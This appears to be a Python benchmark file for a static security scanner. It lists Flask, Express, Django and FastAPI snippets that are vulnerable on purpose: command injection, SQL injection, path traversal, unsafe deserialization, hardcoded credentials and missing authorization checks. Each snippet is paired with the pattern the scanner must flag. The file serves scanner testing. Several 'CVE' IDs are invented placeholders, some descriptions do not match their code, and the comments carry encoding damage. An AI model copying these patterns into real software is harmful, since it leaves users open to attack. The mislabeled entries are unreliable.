"""
benchmarks.cve_corpus
Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
Minimal reproducing code snippets for real CVE entries,
curated to test ansede-static recall rates.

Each entry maps:
  cve_id        Ã¢â€ â€™ real NVD CVE identifier
    language      Ã¢â€ â€™ "python" | "javascript" | "go" | "java" | "csharp"
  description   Ã¢â€ â€™ what the CVE is about
  cwe           Ã¢â€ â€™ expected CWE the scanner must flag
  snippet       Ã¢â€ â€™ minimal code that reproduces the vulnerability pattern
  expected_hit  Ã¢â€ â€™ re.Pattern that must appear in finding title/description/cwe

References:
  https://nvd.nist.gov/vuln/detail/<cve_id>
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Iterable


@dataclass
class CVEEntry:
    cve_id: str
    language: str              # "python" | "javascript" | "go" | "java" | "csharp"
    description: str
    cwe: str                   # expected CWE, e.g. "CWE-78"
    snippet: str               # minimal reproducing code
    expected_hit: str          # regex that must match a finding
    severity_min: str = "high" # minimum severity expected
    sink_family: str = ""      # optional explicit sink-family override for scoreboards
    # Sink-centric coordinate matching (Phase 1 enhancement).
    # When set, a finding whose reported line number matches sink_line is also
    # counted as a True Positive even if expected_hit does not match the text.
    # This prevents false-negatives caused solely by CWE label text mismatch.
    sink_line: int | None = None
    sink_col: int | None = None


_SINK_FAMILY_BY_CWE: dict[str, str] = {
    "CWE-22": "path-traversal",
    "CWE-78": "command-execution",
    "CWE-79": "xss-template-injection",
    "CWE-89": "data-injection",
    "CWE-90": "data-injection",
    "CWE-94": "code-execution",
    "CWE-95": "code-execution",
    "CWE-98": "code-loading",
    "CWE-113": "header-injection",
    "CWE-200": "information-exposure",
    "CWE-285": "access-control",
    "CWE-287": "access-control",
    "CWE-295": "transport-security",
    "CWE-307": "rate-limit-bruteforce",
    "CWE-327": "weak-crypto",
    "CWE-345": "token-trust",
    "CWE-347": "token-trust",
    "CWE-352": "csrf",
    "CWE-377": "race-condition",
    "CWE-400": "denial-of-service",
    "CWE-434": "unsafe-upload",
    "CWE-470": "unsafe-reflection",
    "CWE-494": "supply-chain-execution",
    "CWE-502": "unsafe-deserialization",
    "CWE-601": "open-redirect",
    "CWE-611": "xxe",
    "CWE-614": "cookie-session-security",
    "CWE-639": "access-control",
    "CWE-732": "permission-misconfiguration",
    "CWE-798": "hardcoded-secret",
    "CWE-862": "access-control",
    "CWE-918": "ssrf",
    "CWE-942": "cors-misconfiguration",
    "CWE-943": "data-injection",
    "CWE-1321": "prototype-pollution",
    "CWE-1333": "regex-dos",
}


def sink_family_for_cwe(cwe: str | None) -> str:
    normalized = (cwe or "").strip().upper()
    if not normalized:
        return "other"
    return _SINK_FAMILY_BY_CWE.get(normalized, "other")


def entry_sink_family(entry: CVEEntry) -> str:
    if entry.sink_family:
        return entry.sink_family.strip().lower()
    return sink_family_for_cwe(entry.cwe)


def sink_families_for_cwes(cwes: Iterable[str | None]) -> tuple[str, ...]:
    families = {
        sink_family_for_cwe(cwe)
        for cwe in cwes
        if str(cwe or "").strip()
    }
    return tuple(sorted(families))


CVE_CORPUS: list[CVEEntry] = [

    # Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
    # Python CVEs
    # Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬

    CVEEntry(
        cve_id="CVE-2022-24439",
        language="python",
        cwe="CWE-78",
        description=(
            "GitPython Ã¢â€°Â¤3.1.29 Ã¢â‚¬â€ insufficient sanitization of user-supplied arguments "
            "passed to git commands via shell=True."
        ),
        snippet="""
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route(\"/clone\")
def clone_repo():
    repo_url = request.args.get(\"url\")
    # Vulnerable: shell=True with user-supplied URL
    result = subprocess.run(
        f\"git clone {repo_url} /tmp/work\",
        shell=True, capture_output=True, text=True
    )
    return result.stdout
""",
        expected_hit=r"CWE-78|[Cc]ommand [Ii]njection|shell=True",
    ),

    CVEEntry(
        cve_id="CVE-2022-36087",
        language="python",
        cwe="CWE-918",
        description=(
            "oauthlib Ã¢â€°Â¤3.2.1 Ã¢â‚¬â€ SSRF / redirect to attacker-controlled server "
            "via unvalidated redirect_uri in OAuth flow."
        ),
        snippet="""
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route(\"/oauth/callback\")
def oauth_callback():
    callback_url = request.args.get(\"redirect_uri\")
    # Vulnerable: fetches attacker-supplied URL
    token_response = requests.post(callback_url, data={\"grant_type\": \"authorization_code\"})
    return token_response.json()
""",
        expected_hit=r"CWE-918|SSRF|[Ss]erver.[Ss]ide [Rr]equest",
    ),

    CVEEntry(
        cve_id="CVE-2019-14234",
        language="python",
        cwe="CWE-89",
        description=(
            "Django 1.11Ã¢â‚¬â€œ2.2 Ã¢â‚¬â€ SQL injection via JSONField keys used in queryset filters "
            "when passed as untrusted keyword arguments."
        ),
        snippet="""
import sqlite3
from flask import Flask, request

app = Flask(__name__)
db = sqlite3.connect(\":memory:\", check_same_thread=False)

@app.route(\"/search\")
def search():
    name = request.args.get(\"name\")
    # Vulnerable: f-string in SQL
    rows = db.execute(f\"SELECT * FROM users WHERE name = '{name}'\").fetchall()
    return str(rows)
""",
        expected_hit=r"CWE-89|[Ss][Qq][Ll] [Ii]njection",
    ),

    CVEEntry(
        cve_id="CVE-2021-28677",
        language="python",
        cwe="CWE-22",
        description=(
            "Pillow Ã¢â€°Â¤8.1.2 Ã¢â‚¬â€ path traversal in EPS image processing "
            "allows arbitrary file read."
        ),
        snippet="""
import os
from flask import Flask, request, send_file

app = Flask(__name__)
BASE_DIR = \"/var/uploads\"

@app.route(\"/download\")
def download():
    filename = request.args.get(\"file\")
    # Vulnerable: no sanitization Ã¢â‚¬â€ ../../etc/passwd works
    full_path = os.path.join(BASE_DIR, filename)
    return send_file(full_path)
""",
        expected_hit=r"CWE-22|[Pp]ath [Tt]raversal",
    ),

    CVEEntry(
        cve_id="CVE-2023-36813",
        language="python",
        cwe="CWE-22",
        description=(
            "Starlette Ã¢â€°Â¤0.27.0 Ã¢â‚¬â€ path traversal in StaticFiles via crafted URL "
            "with double-encoded sequences."
        ),
        snippet="""
import os
from flask import Flask, request

app = Flask(__name__)
STATIC_DIR = \"/app/static\"

@app.route(\"/static/<path:filepath>\")
def serve_static(filepath):
    # Vulnerable: no realpath check
    target = os.path.join(STATIC_DIR, filepath)
    with open(target, \"rb\") as f:
        return f.read()
""",
        expected_hit=r"CWE-22|[Pp]ath [Tt]raversal",
    ),

    CVEEntry(
        cve_id="CVE-2021-32556",
        language="python",
        cwe="CWE-502",
        description=(
            "Celery Ã¢â‚¬â€ deserialization of untrusted data via pickle backend "
            "allows RCE from a compromised broker."
        ),
        snippet="""
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route(\"/task\", methods=[\"POST\"])
def run_task():
    # Vulnerable: deserializes attacker-controlled bytes
    task_data = request.get_json().get(\"task\")
    task = pickle.loads(base64.b64decode(task_data))
    return {\"result\": task.run()}
""",
        expected_hit=r"CWE-502|[Dd]eserialization|pickle",
    ),

    CVEEntry(
        cve_id="CVE-2022-45919",
        language="python",
        cwe="CWE-327",
        description=(
            "Application uses MD5 to hash user passwords, making them trivially "
            "crackable via rainbow tables or GPU brute-force."
        ),
        snippet="""
import hashlib
import sqlite3
from flask import Flask, request

app = Flask(__name__)
db = sqlite3.connect(\":memory:\", check_same_thread=False)

@app.route(\"/register\", methods=[\"POST\"])
def register():
    password = request.form.get(\"password\")
    # Vulnerable: MD5 for password hashing
    hashed = hashlib.md5(password.encode()).hexdigest()
    db.execute(\"INSERT INTO users (password_hash) VALUES (?)\", (hashed,))
    return {\"status\": \"registered\"}
""",
        expected_hit=r"CWE-327|[Ww]eak.*hash|MD5|SHA1",
    ),

    CVEEntry(
        cve_id="CVE-2021-HARDCODED",
        language="python",
        cwe="CWE-798",
        description="Hardcoded AWS credentials in source code.",
        snippet="""
import boto3

AWS_ACCESS_KEY_ID = \"AKIAIOSFODNN7EXAMPLE\"
AWS_SECRET_ACCESS_KEY = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"

client = boto3.client(
    's3',
    aws_access_key_id=AWS_ACCESS_KEY_ID,
    aws_secret_access_key=AWS_SECRET_ACCESS_KEY
)
""",
        expected_hit=r"CWE-798|[Hh]ardcoded|[Aa][Ww][Ss]",
    ),

    CVEEntry(
        cve_id="CVE-2021-IDOR",
        language="python",
        cwe="CWE-639",
        description="IDOR Ã¢â‚¬â€ authenticated route returns any user's document by ID without ownership check.",
        snippet="""
import sqlite3
from flask import Flask, request, g
from functools import wraps

app = Flask(__name__)
db = sqlite3.connect(\":memory:\", check_same_thread=False)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get(\"Authorization\")
        if token:
            g.user_id = 42  # would be from JWT in real code
            return f(*args, **kwargs)
        return {\"error\": \"unauthorized\"}, 401
    return decorated

@app.route(\"/docs/<int:doc_id>\")
@login_required
def get_doc(doc_id):
    # Vulnerable: no ownership check Ã¢â‚¬â€ any user can see any doc
    row = db.execute(\"SELECT * FROM docs WHERE id = ?\", (doc_id,)).fetchone()
    return dict(row) if row else ({\"error\": \"not found\"}, 404)
""",
        expected_hit=r"CWE-639|IDOR|[Oo]wnership",
    ),

    CVEEntry(
        cve_id="CVE-2022-AUTH-BYPASS",
        language="python",
        cwe="CWE-287",
        description="Auth bypass Ã¢â‚¬â€ decorator checks token presence only, never validates the value.",
        snippet="""
from flask import Flask, request, jsonify
from functools import wraps

app = Flask(__name__)

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        # Vulnerable: checks presence only Ã¢â‚¬â€ any non-empty string passes
        token = request.headers.get(\"Authorization\")
        if token:
            return f(*args, **kwargs)
        return jsonify({\"error\": \"unauthorized\"}), 401
    return decorated

@app.route(\"/admin/users\")
@require_auth
def admin_users():
    return jsonify({\"users\": []})
""",
        expected_hit=r"CWE-287|[Aa]uth.*[Bb]ypass|presence",
    ),

    CVEEntry(
        cve_id="CVE-2024-PY-HELPER-RETURN-SQLI",
        language="python",
        cwe="CWE-89",
        description=(
            "Helper return-value taint reaches a SQL sink through an intermediate "
            "function call chain."
        ),
        snippet="""
import sqlite3
from flask import request

def get_user_id():
    return request.args.get('user_id')

def get_order():
    uid = get_user_id()
    db = sqlite3.connect(':memory:')
    db.execute(f"SELECT * FROM orders WHERE id={uid}")
""",
        expected_hit=r"CWE-89|[Ss][Qq][Ll] [Ii]njection|get_user_id",
    ),

    CVEEntry(
        cve_id="CVE-2024-PY-FORM-IDOR",
        language="python",
        cwe="CWE-639",
        description=(
            "Authenticated ORM lookup by form-sourced id without an ownership filter."
        ),
        snippet="""
from flask import Flask, request
app = Flask(__name__)

def login_required(f):
    return f

@app.route('/orders', methods=['POST'])
@login_required
def get_order():
    user_id = request.form.get('id')
    order = db.session.query(Order).filter_by(id=user_id).first()
    return str(order)
""",
        expected_hit=r"CWE-639|IDOR|ownership|filter_by\(id=user_id\)",
    ),

    CVEEntry(
        cve_id="CVE-2024-PY-DICT-FORMAT-SQLI",
        language="python",
        cwe="CWE-89",
        description="Percent-format SQL injection using a dict-built interpolation payload.",
        snippet="""
from flask import request

def q(cursor):
    user_id = request.args.get('id')
    cursor.execute("SELECT * FROM users WHERE id = '%(id)s'" % {"id": user_id})
""",
        expected_hit=r"CWE-89|[Ss][Qq][Ll] [Ii]njection|%\s*\{",
    ),

    CVEEntry(
        cve_id="CVE-2024-PY-CBV-MISSING-AUTH",
        language="python",
        cwe="CWE-862",
        description="Django class-based view with get() but no LoginRequiredMixin or auth method decorator.",
        snippet="""
from django.views import View

class AdminUsersView(View):
    def get(self, request):
        return {"users": []}
""",
        expected_hit=r"CWE-862|CBV|class-based view|auth mixin",
    ),

    CVEEntry(
        cve_id="CVE-2024-PY-CBV-IDOR",
        language="python",
        cwe="CWE-639",
        description="Django DetailView without a user-scoped get_queryset() override.",
        snippet="""
from django.views.generic import DetailView

class OrderDetailView(DetailView):
    model = Order
""",
        expected_hit=r"CWE-639|get_queryset|user-scoped|DetailView",
    ),

    CVEEntry(
        cve_id="CVE-2024-PY-CBV-OWNERSHIP",
        language="python",
        cwe="CWE-285",
        description="Django UpdateView get_queryset() override lacks ownership scoping.",
        snippet="""
from django.views.generic import UpdateView

class OrderUpdateView(UpdateView):
    model = Order

    def get_queryset(self):
        return Order.objects.all()
""",
        expected_hit=r"CWE-285|ownership|get_queryset|UpdateView",
    ),

    CVEEntry(
        cve_id="CVE-2024-PY-FASTAPI-DEPENDS-BYPASS",
        language="python",
        cwe="CWE-287",
        description="FastAPI route uses Depends() but the dependency does not perform authentication.",
        snippet="""
from fastapi import FastAPI, Depends

app = FastAPI()

def load_context():
    return {"tenant": "demo"}

@app.get('/admin/users')
async def list_users(ctx=Depends(load_context)):
    return {'users': []}
""",
        expected_hit=r"CWE-287|Depends|auth verification|FastAPI",
    ),

    CVEEntry(
        cve_id="CVE-2024-PY-FASTAPI-MUTATION-NO-DEPENDS",
        language="python",
        cwe="CWE-862",
        description="FastAPI DELETE route with no Depends/Security auth dependency.",
        snippet="""
from fastapi import FastAPI

app = FastAPI()

@app.delete('/orders/{order_id}')
async def delete_order(order_id: int):
    return {'deleted': order_id}
""",
        expected_hit=r"CWE-862|DELETE route|auth dependency|FastAPI",
    ),

    CVEEntry(
        cve_id="CVE-2023-PY-ADMIN-ACCESS",
        language="python",
        cwe="CWE-285",
        description="Broken access control Ã¢â‚¬â€ admin route authenticates the caller but never verifies an admin role or permission.",
        snippet="""
from flask import Flask
from functools import wraps

app = Flask(__name__)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        return f(*args, **kwargs)
    return decorated

@app.route("/admin/users")
@login_required
def admin_users():
    return {"users": []}
""",
        expected_hit=r"CWE-285|[Bb]roken access control|admin endpoint",
    ),

    CVEEntry(
        cve_id="CVE-2021-SILENT-EX",
        language="python",
        cwe="CWE-617",
        description="Silent exception swallowing hides critical errors.",
        snippet="""
import os

def delete_user_file(filename):
    try:
        os.remove(filename)
    except Exception:
        pass  # silently ignore deletion failure
""",
        expected_hit=r"[Ss]ilent.*exception|[Ss]wallow",
    ),

    CVEEntry(
        cve_id="CVE-2022-YAML-LOAD",
        language="python",
        cwe="CWE-502",
        description="yaml.load() without SafeLoader allows arbitrary Python object construction.",
        snippet="""
import yaml
from flask import Flask, request

app = Flask(__name__)

@app.route(\"/config\", methods=[\"POST\"])
def load_config():
    data = request.get_data(as_text=True)
    # Vulnerable: yaml.load without SafeLoader
    config = yaml.load(data)
    return str(config)
""",
        expected_hit=r"CWE-502|[Yy][Aa][Mm][Ll]\.load|[Dd]eserialization",
    ),

    # Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
    # JavaScript CVEs
    # Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬

    CVEEntry(
        cve_id="CVE-2019-10744",
        language="javascript",
        cwe="CWE-1321",
        description=(
            "lodash Ã¢â€°Â¤4.17.11 Ã¢â‚¬â€ prototype pollution via _.defaultsDeep(), _.merge(), _.mergeWith() "
            "with user-controlled objects."
        ),
        snippet="""
const express = require('express');
const app = express();
app.use(express.json());

app.post('/api/settings', (req, res) => {
  // Vulnerable: spreading req.body can contain __proto__
  const config = {};
  Object.assign(config, req.body);
  res.json({ updated: true });
});
""",
        expected_hit=r"CWE-1321|[Pp]rototype [Pp]ollution",
    ),

    CVEEntry(
        cve_id="CVE-2021-23337",
        language="javascript",
        cwe="CWE-78",
        description=(
            "lodash Ã¢â€°Â¤4.17.21 Ã¢â‚¬â€ command injection in _.template() "
            "via the variable property when user-controlled data is used."
        ),
        snippet="""
const { exec } = require('child_process');
const express = require('express');
const app = express();

app.get('/run', (req, res) => {
  const cmd = req.query.command;
  // Vulnerable: exec with template literal from user input
  exec(`git log --author="${cmd}" --oneline`, (err, stdout) => {
    res.send(stdout);
  });
});
""",
        expected_hit=r"CWE-78|[Cc]ommand [Ii]njection|exec",
    ),

    CVEEntry(
        cve_id="CVE-2020-28500",
        language="javascript",
        cwe="CWE-1333",
        description=(
            "lodash Ã¢â€°Â¤4.17.20 Ã¢â‚¬â€ ReDoS via the _.trim(), _.trimStart(), _.trimEnd() "
            "functions with catastrophically-backtracking regex."
        ),
        snippet="""
// Vulnerable: ambiguous quantifier nesting Ã¢â‚¬â€ potential catastrophic backtracking
const INPUT_RE = new RegExp('^([a-zA-Z0-9]+)*@([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$');

function validateEmail(email) {
  return INPUT_RE.test(email);
}
""",
        expected_hit=r"CWE-1333|[Rr]e[Dd]o[Ss]|backtrack",
    ),

    CVEEntry(
        cve_id="CVE-2021-32855",
        language="javascript",
        cwe="CWE-79",
        description=(
            "Stored XSS via innerHTML assignment Ã¢â‚¬â€ user-controlled content "
            "inserted into the DOM without sanitization."
        ),
        snippet="""
async function renderUserProfile(userId) {
  const response = await fetch(`/api/users/${userId}`);
  const user = await response.json();
  // Vulnerable: user.bio is attacker-controlled
  document.getElementById('bio').innerHTML = user.bio;
}
""",
        expected_hit=r"CWE-79|XSS|innerHTML",
    ),

    CVEEntry(
        cve_id="CVE-2022-JS-SQLI",
        language="javascript",
        cwe="CWE-89",
        description="SQL injection via template literal in database query.",
        snippet="""
const express = require('express');
const mysql = require('mysql2/promise');
const app = express();

app.get('/user', async (req, res) => {
  const db = await mysql.createConnection(process.env.DB_URL);
  const userId = req.query.id;
  // Vulnerable: template literal SQL
  const [rows] = await db.query(`SELECT * FROM users WHERE id = '${userId}'`);
  res.json(rows);
});
""",
        expected_hit=r"CWE-89|[Ss][Qq][Ll] [Ii]njection",
    ),

    CVEEntry(
        cve_id="CVE-2022-JWT-HARDCODED",
        language="javascript",
        cwe="CWE-798",
        description="JWT signed with a hardcoded weak secret.",
        snippet="""
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

app.post('/login', (req, res) => {
  const { username } = req.body;
  // Vulnerable: hardcoded JWT secret
  const token = jwt.sign({ username }, 'mysecretpassword123', { expiresIn: '1h' });
  res.json({ token });
});
""",
        expected_hit=r"CWE-798|[Hh]ardcoded|JWT.*secret",
    ),

    CVEEntry(
        cve_id="CVE-2021-CORS-WILDCARD",
        language="javascript",
        cwe="CWE-942",
        description="CORS configured with origin: '*' allowing any origin.",
        snippet="""
const cors = require('cors');
const express = require('express');
const app = express();

app.use(cors({ origin: '*', credentials: true }));

app.get('/api/data', (req, res) => {
  res.json({ secret: 'data' });
});
""",
        expected_hit=r"CWE-942|CORS|wildcard|\*",
    ),

    CVEEntry(
        cve_id="CVE-2022-OPEN-REDIRECT",
        language="javascript",
        cwe="CWE-601",
        description="Open redirect via user-controlled redirect_to parameter.",
        snippet="""
const express = require('express');
const app = express();

app.get('/login', (req, res) => {
  // After login, redirect to user-supplied URL
  const redirectTo = req.query.redirect_to;
  // Vulnerable: no validation of redirect target
  res.redirect(redirectTo);
});
""",
        expected_hit=r"CWE-601|[Oo]pen [Rr]edirect",
    ),

        CVEEntry(
                cve_id="CVE-2023-JS-IDOR",
                language="javascript",
                cwe="CWE-639",
                description="Express route returns an arbitrary profile by route ID without auth or ownership scoping.",
                snippet="""
const express = require('express');
const app = express();

app.get('/profiles/:id', async (req, res) => {
    const profileId = req.params.id;
    const profile = await Profile.findByPk(profileId);
    res.json(profile);
});
""",
                expected_hit=r"CWE-639|IDOR|[Oo]wnership",
        ),

        CVEEntry(
                cve_id="CVE-2023-JS-OWNERSHIP",
                language="javascript",
                cwe="CWE-285",
                description="Authenticated Express delete route mutates a record loaded by route ID without verifying ownership.",
                snippet="""
const express = require('express');
const app = express();

function requireAuth(req, res, next) {
    return next();
}

app.delete('/posts/:postId', requireAuth, async (req, res) => {
    const postId = req.params.postId;
    const post = await Post.findByPk(postId);
    await post.destroy();
    res.status(204).end();
});
""",
                expected_hit=r"CWE-285|[Oo]wnership",
        ),

        CVEEntry(
                cve_id="CVE-2023-JS-MISSING-AUTH",
                language="javascript",
                cwe="CWE-862",
                description="Administrative Express route is exposed without authentication middleware.",
                snippet="""
const express = require('express');
const app = express();

app.get('/admin/users', async (req, res) => {
    const users = await User.findAll();
    res.json(users);
});
""",
                expected_hit=r"CWE-862|[Mm]issing auth|admin route",
        ),

        CVEEntry(
                cve_id="CVE-2023-JS-ADMIN-ACCESS",
                language="javascript",
                cwe="CWE-285",
                description="Administrative Express route authenticates callers but never checks for an admin role or permission.",
                snippet="""
const express = require('express');
const app = express();

function requireAuth(req, res, next) {
    return next();
}

app.get('/admin/users', requireAuth, async (req, res) => {
    const users = await User.findAll();
    res.json(users);
});
""",
                expected_hit=r"CWE-285|[Bb]roken access control|admin route",
        ),

        CVEEntry(
                cve_id="CVE-2023-JS-AUTH-BYPASS",
                language="javascript",
                cwe="CWE-287",
                description="Administrative Express route checks only for token presence, allowing access with any non-empty credential value.",
                snippet="""
const express = require('express');
const app = express();

app.get('/admin/audit', (req, res) => {
    const token = req.headers.authorization;
    if (!token) {
        return res.status(401).end();
    }
    res.json({ ok: true });
});
""",
                expected_hit=r"CWE-287|[Aa]uth bypass|presence-only",
        ),

    # Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ New entries validating newly-added detection rules Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬

    CVEEntry(
        cve_id="CVE-2021-LODASH-PROTO-POLL",
        language="javascript",
        cwe="CWE-1321",
        description=(
            "lodash <4.17.21 Ã¢â‚¬â€ prototype pollution via _.merge() with attacker-controlled "
            "objects. Here via a deep-merge helper used directly on req.body."
        ),
        snippet="""
const _ = require('lodash');
const express = require('express');
const app = express();
app.use(express.json());

app.post('/settings', (req, res) => {
  const userSettings = {};
  _.merge(userSettings, req.body);   // CVE-2020-8203 pattern
  res.json({ ok: true });
});
""",
        expected_hit=r"CWE-1321|[Pp]rototype [Pp]ollution|deep.?merge",
    ),

    CVEEntry(
        cve_id="CVE-2022-NODE-SERIALIZE-RCE",
        language="javascript",
        cwe="CWE-502",
        description=(
            "node-serialize 0.0.4 Ã¢â‚¬â€ remote code execution via IIFE payload in "
            "serialized objects passed to `unserialize()`."
        ),
        snippet="""
const serialize = require('node-serialize');
const express = require('express');
const app = express();

app.post('/restore', (req, res) => {
  const obj = serialize.unserialize(req.body.data);  // CVE-2017-5941 / node-serialize RCE
  res.json({ result: obj });
});
""",
        expected_hit=r"CWE-502|[Uu]nserialize|[Dd]eserialization",
    ),

    CVEEntry(
        cve_id="CVE-2022-XXE-EXPRESS",
        language="javascript",
        cwe="CWE-611",
        description="Express route parses user-supplied XML without disabling external entities.",
        snippet="""
const express = require('express');
